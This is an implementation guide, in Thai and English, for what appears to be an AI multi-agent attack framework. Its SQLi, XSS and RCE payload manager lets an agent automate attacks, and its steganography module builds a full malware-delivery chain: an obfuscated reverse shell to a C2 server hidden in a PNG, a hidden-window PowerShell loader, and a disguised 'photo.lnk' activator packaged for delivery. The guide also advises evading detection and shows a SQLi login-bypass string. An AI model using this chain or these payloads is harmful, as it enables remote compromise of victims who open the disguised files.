# Implementation Guide - Core Components

เอกสารนี้อธิบายการใช้งาน Core Components ที่พัฒนาขึ้นใหม่

---

## 1. PayloadManager

### ภาพรวม
PayloadManager จัดการ payloads สำหรับการโจมตีหลายประเภท รองรับการโหลด, จัดเก็บ, และดึง payloads แบบมีประสิทธิภาพ

### การใช้งาน

```python
from tools.payload_manager import PayloadManager
from data_hub.redis_manager import RedisManager

# Initialize
redis_manager = RedisManager(REDIS_CONFIG)
payload_manager = PayloadManager(redis_manager)

# Generate sample payloads สำหรับทดสอบ
payload_manager.generate_sample_payloads('sqli', 1000)
payload_manager.generate_sample_payloads('xss', 1000)

# Load payloads จากไฟล์
results = payload_manager.load_all_payloads()
print(f"Loaded: {results}")

# Get payload
sqli_payload = payload_manager.get_payload('sqli', encoding='url')
xss_payload = payload_manager.get_payload('xss', encoding='html')

# Get batch payloads
batch = payload_manager.get_batch_payloads('rce', count=10)

# Validate payload
is_valid = payload_manager.validate_payload(sqli_payload, 'sqli')

# Record result
payload_manager.record_result(
    payload=sqli_payload,
    payload_type='sqli',
    success=True,
    details='Login bypassed'
)

# Get stats
stats = payload_manager.get_stats()
```

### Payload Types

- **sqli**: SQL Injection payloads
- **xss**: Cross-Site Scripting payloads
- **rce**: Remote Code Execution payloads
- **fuzzing**: Fuzzing payloads
- **stego**: Steganography payloads

### Encoding Options

- `base64`: Base64 encoding
- `url`: URL encoding
- `html`: HTML encoding
- `hex`: Hexadecimal encoding
- `none`: No encoding

---

## 2. SteganographyTool

### ภาพรวม
SteganographyTool ให้เครื่องมือสำหรับซ่อน payload ในไฟล์ภาพและสร้าง delivery mechanisms

### การใช้งาน

#### 2.1 LSB Steganography

```python
from tools.steganography_tool import SteganographyTool

# Embed payload in image
payload = "powershell.exe -Command ..."
stego_path = SteganographyTool.embed_payload_lsb(
    image_path='original.png',
    payload=payload,
    output_path='stego.png'
)

# Extract payload from image
extracted = SteganographyTool.extract_payload_lsb('stego.png')
```

#### 2.2 Polyglot Files

```python
# Create PNG/ZIP polyglot
polyglot_path = SteganographyTool.create_polyglot_png_zip(
    image_path='original.png',
    payload='secret data',
    output_path='polyglot.png'
)
# ไฟล์นี้เปิดเป็นภาพได้ และแตกเป็น ZIP ได้ (เปลี่ยนนามสกุลเป็น .zip)
```

#### 2.3 Reverse Shell Payload

```python
# Create obfuscated reverse shell
shell_payload = SteganographyTool.create_reverse_shell_payload(
    c2_ip='192.168.1.100',
    c2_port=4444,
    obfuscate=True
)
```

#### 2.4 PowerShell Loader

```python
# Create PowerShell script that extracts and runs payload from image
loader_path = SteganographyTool.create_powershell_stego_loader(
    stego_image_path='stego.png',
    c2_server='192.168.1.100:4444',
    output_path='loader.ps1'
)
```

#### 2.5 LNK Activator

```python
# Create .lnk file that runs payload
lnk_path = SteganographyTool.create_lnk_activator(
    target_exe='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    arguments='-NoP -NonI -W Hidden -File loader.ps1',
    icon_path='icon.ico',
    output_path='document.lnk'
)
```

### Complete Steganography Workflow

```python
# 1. Create reverse shell payload
shell = SteganographyTool.create_reverse_shell_payload('10.0.0.1', 4444)

# 2. Embed in image
stego = SteganographyTool.embed_payload_lsb('photo.png', shell, 'photo_stego.png')

# 3. Create loader
loader = SteganographyTool.create_powershell_stego_loader(stego, output_path='run.ps1')

# 4. Create LNK activator
lnk = SteganographyTool.create_lnk_activator(
    'powershell.exe',
    f'-File {loader}',
    output_path='photo.lnk'
)

# 5. Package for delivery (zip photo_stego.png + photo.lnk)
```

---

## 3. OptimizedRedisManager

### ภาพรวม
OptimizedRedisManager ปรับปรุงประสิทธิภาพการใช้งาน Redis ด้วย connection pooling, caching, และ pub/sub

### การใช้งาน

#### 3.1 Basic Operations

```python
from data_hub.optimized_redis_manager import OptimizedRedisManager

# Initialize with connection pool
redis_manager = OptimizedRedisManager(
    config=REDIS_CONFIG,
    pool_size=50
)

# State management
redis_manager.set_state('ATTACKING')
current_state = redis_manager.get_state()

# Caching layer
redis_manager.set_cached('key', 'value', redis_ttl=300)
value = redis_manager.get_cached('key', ttl=60)
```

#### 3.2 Batch Operations

```python
# Batch log observations
observations = [
    {'agent': 'Observer', 'message': 'Packet captured'},
    {'agent': 'Observer', 'message': 'Anomaly detected'}
]
redis_manager.batch_log_observations(observations)

# Batch push actions
actions = [
    {'action_type': 'SCAN', 'target': '192.168.1.1'},
    {'action_type': 'EXPLOIT', 'target': '192.168.1.2'}
]
redis_manager.batch_push_actions(actions)

# Batch get keys
keys = ['KEY1', 'KEY2', 'KEY3']
values = redis_manager.batch_get_keys(keys)
```

#### 3.3 Pub/Sub

```python
# Define callback
def on_alert(message):
    print(f"Alert received: {message}")

# Subscribe to channel
redis_manager.subscribe('ALERTS', on_alert)

# Start listening (non-blocking)
redis_manager.start_listening()

# Publish message
redis_manager.publish('ALERTS', {'type': 'vulnerability', 'severity': 'high'})
```

#### 3.4 Health Monitoring

```python
# Check health
health = redis_manager.get_health_status()
print(f"Connected: {health['connected']}")
print(f"Errors: {health['errors']}")

# Get stats
stats = redis_manager.get_stats()
print(f"Operations/sec: {stats['ops_per_sec']}")
print(f"Memory used: {stats['used_memory']}")
```

---

## 4. Observability Tools

### ภาพรวม
Observability tools ให้ structured logging, metrics collection, และ performance monitoring

### การใช้งาน

#### 4.1 Structured Logger

```python
from tools.observability import StructuredLogger

# Initialize
logger = StructuredLogger('PlannerAgent', redis_manager=redis_manager)

# Basic logging
logger.info("System started")
logger.debug("Debug info", details={'key': 'value'})
logger.warning("Warning", tags=['security'])
logger.error("Error occurred")

# Log action
logger.log_action(
    action_type='SCAN_NETWORK',
    target='192.168.1.0/24',
    result='success',
    duration=5.2
)

# Log attack
logger.log_attack(
    attack_type='SQLi',
    target='login_form',
    payload="' OR 1=1--",
    success=True,
    response='Login successful'
)

# Log vulnerability
logger.log_vulnerability(
    vuln_type='SQL Injection',
    severity='high',
    description='Login bypass via SQLi',
    proof='Payload: \' OR 1=1--'
)

# Get stats
stats = logger.get_stats()
```

#### 4.2 Metrics Collector

```python
from tools.observability import MetricsCollector

# Initialize
metrics = MetricsCollector(redis_manager)

# Record metric
metrics.record_metric('cpu_usage', 75.5, tags={'host': 'server1'})

# Record counter
metrics.record_counter('attacks_total', increment=1, tags={'type': 'sqli'})

# Record timer
metrics.record_timer('exploit_duration', 2.5, tags={'exploit': 'sqli'})

# Get stats
stats = metrics.get_metric_stats('cpu_usage', time_range=3600)
print(f"Average: {stats['avg']}")
print(f"Max: {stats['max']}")

# Get all metrics
all_stats = metrics.get_all_metrics()
```

#### 4.3 Performance Monitor

```python
from tools.observability import PerformanceMonitor, MetricsCollector

metrics = MetricsCollector(redis_manager)
monitor = PerformanceMonitor(metrics)

# Using context manager
with monitor.measure('network_scan', tags={'target': '192.168.1.0/24'}):
    # Perform network scan
    time.sleep(2)

# Manual timing
timer_id = monitor.start_timer('exploit_execution')
# Perform exploit
duration = monitor.stop_timer(timer_id, tags={'type': 'sqli'})
```

---

## 5. Testing Framework

### ภาพรวม
Testing framework รองรับ unit tests, integration tests, และ E2E tests

### การใช้งาน

#### 5.1 Running Tests

```bash
# Run all tests
cd RebirthRC_AI_PT
python -m pytest tests/ -v

# Run specific test file
python -m pytest tests/test_framework.py -v

# Run with coverage
python -m pytest tests/ --cov=. --cov-report=html
```

#### 5.2 Writing Unit Tests

```python
from tests.test_framework import AgentTestCase

class TestMyAgent(AgentTestCase):
    def test_agent_initialization(self):
        """Test agent initialization"""
        from agents.planner_agent import PlannerAgent
        
        agent = PlannerAgent(self.redis_manager, self.agent_config)
        assert agent.name == 'TestAgent'
    
    def test_agent_action(self):
        """Test agent action"""
        # Test logic here
        self.assert_observation_logged('TestAgent', 'Action completed')
```

#### 5.3 Writing Integration Tests

```python
class TestIntegration(AgentTestCase):
    def test_agent_communication(self):
        """Test communication between agents"""
        # Planner creates action
        self.redis_manager.push_action({
            'action_type': 'SCAN',
            'target_agent': 'Executor'
        })
        
        # Executor retrieves action
        action = self.redis_manager.pop_action()
        assert action['action_type'] == 'SCAN'
```

---

## 6. Integration with Existing System

### 6.1 Update Agents to Use New Tools

```python
# In agents/planner_agent.py
from tools.payload_manager import PayloadManager
from tools.observability import StructuredLogger

class PlannerAgent(BaseAgent):
    def __init__(self, redis_manager, config):
        super().__init__(redis_manager, config)
        
        # Add new tools
        self.payload_manager = PayloadManager(redis_manager)
        self.logger = StructuredLogger(self.name, redis_manager=redis_manager)
    
    def run(self):
        self.logger.info("Planner Agent started")
        
        # Use payload manager
        payload = self.payload_manager.get_payload('sqli')
        
        # Log action
        self.logger.log_action('PLAN_ATTACK', target='server', result='success')
```

### 6.2 Update main.py

```python
# In main.py
from data_hub.optimized_redis_manager import OptimizedRedisManager

def main():
    # Use optimized Redis manager
    redis_manager = OptimizedRedisManager(REDIS_CONFIG, pool_size=50)
    
    # Subscribe to real-time alerts
    def on_vulnerability(data):
        print(f"[ALERT] Vulnerability found: {data}")
    
    redis_manager.subscribe('VULNERABILITIES', on_vulnerability)
    redis_manager.start_listening()
    
    # Continue with orchestrator
    orchestrator = Orchestrator(redis_manager)
    orchestrator.run()
```

---

## 7. Best Practices

### 7.1 Payload Management

- Generate และ load payloads ก่อนเริ่มระบบ
- ใช้ `get_payload()` แบบ random เพื่อหลบ pattern detection
- บันทึกผลการใช้ payload ด้วย `record_result()`
- ตรวจสอบ stats เป็นระยะด้วย `get_stats()`

### 7.2 Steganography

- ทดสอบ embed/extract ก่อนใช้งานจริง
- ใช้ภาพที่มีขนาดเหมาะสมกับ payload
- Obfuscate PowerShell payloads เสมอ
- ทดสอบ LNK activator บน Windows environment

### 7.3 Redis Optimization

- ใช้ batch operations สำหรับ bulk data
- ใช้ caching layer สำหรับข้อมูลที่อ่านบ่อย
- ใช้ pub/sub สำหรับ real-time notifications
- Monitor health status เป็นระยะ

### 7.4 Observability

- ใช้ structured logging ทุกที่
- Log actions และ attacks พร้อม details
- Collect metrics สำหรับ performance analysis
- ใช้ performance monitor สำหรับ critical operations

### 7.5 Testing

- เขียน unit tests สำหรับ components ใหม่ทุกตัว
- เขียน integration tests สำหรับ agent communication
- รัน tests ก่อน commit code
- Maintain test coverage > 80%

---

## 8. Troubleshooting

### PayloadManager Issues

**Problem**: Payloads not loading
- ตรวจสอบว่าไฟล์ payload อยู่ใน `payloads/` directory
- ตรวจสอบ file permissions
- ลอง generate sample payloads ก่อน

### SteganographyTool Issues

**Problem**: Payload too large for image
- ใช้ภาพที่มีขนาดใหญ่ขึ้น
- Compress payload ก่อน embed
- ใช้ polyglot method แทน LSB

### Redis Issues

**Problem**: Connection errors
- ตรวจสอบว่า Redis server กำลังรันอยู่
- ตรวจสอบ connection config
- ลด pool_size ถ้า connections เต็ม

### Testing Issues

**Problem**: Tests failing
- ตรวจสอบว่าติดตั้ง pytest แล้ว
- ใช้ MockRedisManager สำหรับ unit tests
- Skip tests ที่ต้องการ Redis server จริง

---

## 9. Next Steps

1. **Generate Payloads**: สร้าง payloads ตามที่ระบุใน `payload_requirements.md`
2. **Test Components**: รัน tests เพื่อยืนยันว่า components ทำงานถูกต้อง
3. **Integrate with Agents**: อัปเดต agents ให้ใช้ tools ใหม่
4. **Deploy and Monitor**: Deploy ระบบและ monitor ด้วย observability tools
5. **Iterate**: ปรับปรุงตาม feedback และ metrics

---

> **Note**: เอกสารนี้จะถูกอัปเดตเมื่อมีการเพิ่ม features ใหม่หรือปรับปรุง components
